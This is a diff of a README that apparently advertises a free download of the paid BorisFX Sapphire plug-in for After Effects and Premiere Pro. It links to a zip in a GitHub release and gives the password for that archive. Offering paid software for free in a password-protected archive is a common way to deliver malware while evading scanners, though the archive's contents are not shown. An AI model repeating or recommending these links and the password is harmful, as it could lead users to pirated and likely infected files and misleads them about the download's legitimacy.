@@ -12,7 +12,7 @@ Install the [After Effects (2015+) version x32/x64 bit](https://github.com/black
 
 Install the [Premiere Pro (2015+) version x32/x64 bit](https://github.com/blacktoes-dev/BorisFX-SapphirePlug-in-2025-download/releases/download/installation/plug-in.zip)
 
- *The archive pass is SOL!Launch37
+ *The archive password is ***SOL!Launch37***
 
 # Requirements
 
